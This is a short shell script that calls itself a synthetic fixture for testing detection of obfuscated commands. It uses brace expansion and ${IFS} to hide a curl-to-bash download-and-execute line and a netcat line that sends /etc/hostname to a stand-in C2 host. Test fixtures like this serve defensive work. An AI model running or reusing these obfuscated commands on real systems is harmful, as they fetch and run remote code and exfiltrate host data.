#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: a brace expansion produces the command line, and ${IFS} stands in for spaces.
# Hosts are non-existent .invalid domains.
set -e
{curl,-fsSL,https://dl.example.invalid/i.sh}|{bash,-s}
cat${IFS}/etc/hostname|nc${IFS}c2.example.invalid${IFS}4444
